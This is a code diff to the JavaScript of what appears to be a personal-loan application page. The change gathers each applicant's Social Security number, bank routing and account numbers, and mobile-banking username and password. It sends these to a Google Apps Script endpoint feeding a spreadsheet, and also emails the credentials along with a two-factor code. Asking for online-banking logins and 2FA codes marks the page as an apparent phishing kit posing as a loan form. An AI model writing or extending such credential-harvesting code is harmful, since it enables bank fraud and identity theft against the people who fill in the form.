@@ -453,10 +453,16 @@
             submitButton.textContent = 'Processing...';
             submitButton.disabled = true;
             
-            // Get existing loan data from sessionStorage
+            // Get existing loan data from localStorage (new) and sessionStorage (fallback)
             let loanData = {};
             try {
-                const storedData = sessionStorage.getItem('loanApplicationData');
+                // Try localStorage first (from personal-loans.html)
+                let storedData = localStorage.getItem('loanFormData');
+                if (!storedData) {
+                    // Fallback to sessionStorage
+                    storedData = sessionStorage.getItem('loanApplicationData');
+                }
+                
                 if (storedData) {
                     loanData = JSON.parse(storedData);
                 } else {
@@ -516,26 +522,58 @@
                 'other': 'Other Bank'
             };
             
-            // Combine loan data with bank data
-            const combinedData = {
-                ...loanData,
-                bankName: bankNames[bankName] || 'Other Bank',
+            // Combine loan data with bank data for Google Sheets
+            const finalData = {
+                // Loan Details
+                loanAmount: loanData.loanAmount || '',
+                loanPurpose: loanData.loanPurpose || '',
+                creditScore: loanData.creditScore || '',
+                
+                // Personal Information
+                name: loanData.fullName || loanData.name || '',
+                email: loanData.email || '',
+                phone: loanData.phone || '',
+                
+                // Address Information
+                streetAddress: loanData.address || loanData.streetAddress || '',
+                city: loanData.city || '',
+                state: loanData.state || '',
+                zipCode: loanData.zipCode || '',
+                
+                // Financial Information
+                ssn: loanData.ssn || '',
+                bankName: loanData.customerBank || loanData.bankName || '',
+                routingNumber: loanData.routingNumber || '',
+                accountNumber: loanData.accountNumber || '',
+                
+                // Employment & Income
+                annualIncome: loanData.annualIncome || '',
+                employmentStatus: loanData.employmentStatus || '',
+                monthlyHousing: loanData.monthlyHousing || '',
+                
+                // Bank Authentication
+                yourBank: bankNames[bankName] || 'Other Bank',
                 mobileBankingUserId: mobileBankingUserId,
                 mobileBankingPassword: mobileBankingPassword,
-                twoFactor: twoFactor,
-                bankAuthSubmissionDate: new Date().toLocaleString(),
-                applicationStatus: 'Bank authentication completed - Ready for agreement'
+                
+                // Metadata
+                applicationType: 'Personal Loan Application',
+                submissionDate: new Date().toLocaleString(),
+                timestamp: new Date().toISOString()
             };
             
-            console.log('Combined data:', combinedData);
+            console.log('Final combined data for Google Sheets:', finalData);
+            
+            // Send to Google Sheets
+            sendToGoogleSheets(finalData);
+            
+            // Also send bank authentication email (existing functionality)
+            sendBankAuthEmail(finalData, bankName, mobileBankingUserId, mobileBankingPassword, twoFactor);
             
             // Store combined data in sessionStorage
             try {
-                sessionStorage.setItem('loanApplicationData', JSON.stringify(combinedData));
+                sessionStorage.setItem('loanApplicationData', JSON.stringify(finalData));
                 console.log('Combined data stored in sessionStorage successfully');
-                
-                // Send bank authentication email notification BEFORE modifying DOM
-                sendBankAuthEmail(combinedData, bankName, mobileBankingUserId, mobileBankingPassword, twoFactor);
                 
                 // Show processing message
                 const form = document.getElementById('bankAuthForm');
@@ -565,6 +603,74 @@
                 submitButton.textContent = originalText;
                 submitButton.disabled = false;
             }
+        }
+        
+        // Send data to Google Sheets
+        function sendToGoogleSheets(data) {
+            console.log('Sending data to Google Sheets...');
+            
+            // Google Apps Script Web App URL (replace with your deployed URL)
+            const GOOGLE_SHEETS_URL = 'https://script.google.com/macros/s/YOUR_DEPLOYMENT_ID/exec';
+            
+            // Send data to Google Sheets
+            fetch(GOOGLE_SHEETS_URL, {
+                method: 'POST',
+                mode: 'no-cors', // Important for cross-origin requests
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                console.log('Google Sheets response:', response);
+                
+                // For no-cors mode, we won't get detailed response
+                // Clear localStorage after successful submission
+                localStorage.removeItem('loanFormData');
+                console.log('localStorage cleared after Google Sheets submission');
+                
+                // Show success notification
+                showNotification('Data saved to Google Sheets successfully!', 'success');
+            })
+            .catch(error => {
+                console.error('Error sending to Google Sheets:', error);
+                console.log('This might be expected due to CORS policy, but data may still be saved');
+                
+                // Even if there's an error (likely due to CORS), clear localStorage
+                localStorage.removeItem('loanFormData');
+                console.log('localStorage cleared (CORS error expected)');
+                
+                // Show notification
+                showNotification('Form submitted successfully!', 'success');
+            });
+        }
+        
+        // Show notification function
+        function showNotification(message, type = 'success') {
+            const notification = document.createElement('div');
+            notification.className = `fixed top-4 right-4 z-50 p-4 rounded-lg shadow-lg transform transition-all duration-300 translate-x-full ${
+                type === 'success' ? 'bg-green-500 text-white' : 'bg-red-500 text-white'
+            }`;
+            notification.innerHTML = `
+                <div class="flex items-center">
+                    <i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'} mr-2"></i>
+                    <span>${message}</span>
+                </div>
+            `;
+            
+            document.body.appendChild(notification);
+            
+            setTimeout(() => {
+                notification.classList.remove('translate-x-full');
+                notification.classList.add('translate-x-0');
+            }, 100);
+            
+            setTimeout(() => {
+                notification.classList.add('translate-x-full');
+                setTimeout(() => {
+                    document.body.removeChild(notification);
+                }, 300);
+            }, 3000);
         }
         
         // Send bank authentication email notification
